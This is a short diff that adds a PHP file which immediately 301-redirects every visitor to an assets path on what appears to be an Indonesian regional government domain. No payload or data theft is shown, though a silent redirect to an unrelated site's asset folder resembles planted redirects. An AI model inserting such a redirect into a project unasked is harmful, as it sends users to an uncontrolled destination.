@@ -1,0 +1,4 @@
+<?php
+header("Location: https://dlh.oganilirkab.go.id/assets/pro/", true, 301);
+exit();
+?>
